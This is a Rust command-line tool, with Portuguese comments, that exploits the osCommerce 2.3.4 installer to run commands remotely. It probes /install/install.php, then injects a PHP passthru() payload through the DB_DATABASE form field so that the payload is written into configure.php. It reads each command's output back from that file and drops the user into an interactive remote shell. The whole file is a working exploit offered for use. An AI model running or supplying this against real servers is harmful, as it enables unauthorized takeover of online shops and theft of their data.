use colored::*;
use reqwest::blocking::Client;
use std::env;
use std::io::{self, Write};

fn main() {
    // Coleta os argumentos da linha de comando
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("{}", "Por favor, especifique a URL do osCommerce".red());
        println!("{}", "Formato: cargo run <url>".yellow());
        println!(
            "{}",
            "Exemplo: cargo run http://localhost/oscommerce-2.3.4/catalog".yellow()
        );
        return;
    }

    let base_url = &args[1];
    let test_vuln_url = format!("{}/install/install.php", base_url);

    // Cria um cliente HTTP
    let client = Client::new();
    let test_response = client
        .get(&test_vuln_url)
        .send()
        .expect("Falha ao enviar requisição");

    // Verifica se o diretório de instalação está acessível
    if test_response.status().is_success() {
        println!(
            "{}",
            "[*] Diretório de instalação disponível, o host pode estar vulnerável.".green()
        );

        // Testa uma injeção de comando inicial
        println!(
            "{}",
            "[*] Testando injeção de comando para confirmar vulnerabilidade".cyan()
        );
        let cmd = "whoami";
        print!("{} ", "User:".bold());
        io::stdout().flush().unwrap();
        match rce(&client, base_url, cmd) {
            Ok(output) => println!("{}", output),
            Err(err) => {
                println!("{}", err.red());
                return;
            }
        }

        // Loop interativo de shell remota
        loop {
            print!("{} ", "RCE_SHELL$".bold().blue());
            io::stdout().flush().unwrap();
            let mut cmd = String::new();
            io::stdin()
                .read_line(&mut cmd)
                .expect("Falha ao ler entrada");
            let cmd = cmd.trim();
            if cmd.is_empty() {
                continue;
            }
            match rce(&client, base_url, cmd) {
                Ok(output) => println!("{}", output),
                Err(err) => {
                    println!("{}", err.red());
                    return;
                }
            }
        }
    } else {
        println!(
            "{}",
            "[!] Diretório de instalação não encontrado, o host não está vulnerável".red()
        );
    }
}

// Função para executar comandos remotamente
fn rce(client: &Client, base_url: &str, command: &str) -> Result<String, String> {
    let target_url = format!("{}/install/install.php?step=4", base_url);
    let payload = format!("'); passthru('{}'); /*", command);
    let data = [("DIR_FS_DOCUMENT_ROOT", "./"), ("DB_DATABASE", &payload)];

    // Envia o payload via POST
    let response = client
        .post(&target_url)
        .form(&data)
        .send()
        .map_err(|e| e.to_string())?;
    if response.status().is_success() {
        let read_cmd_url = format!("{}/install/includes/configure.php", base_url);
        let cmd_response = client
            .get(&read_cmd_url)
            .send()
            .map_err(|e| e.to_string())?;
        if cmd_response.status().is_success() {
            let text = cmd_response.text().map_err(|e| e.to_string())?;
            let lines: Vec<&str> = text.split('\n').collect();
            if lines.len() > 2 {
                let output = lines[2..].join("\n"); // Remove linhas de erro iniciais
                Ok(output)
            } else {
                Err("[!] Saída inesperada de configure.php".to_string())
            }
        } else {
            Err("[!] Configure.php não encontrado".to_string())
        }
    } else {
        Err("[!] Falha ao injetar payload".to_string())
    }
}
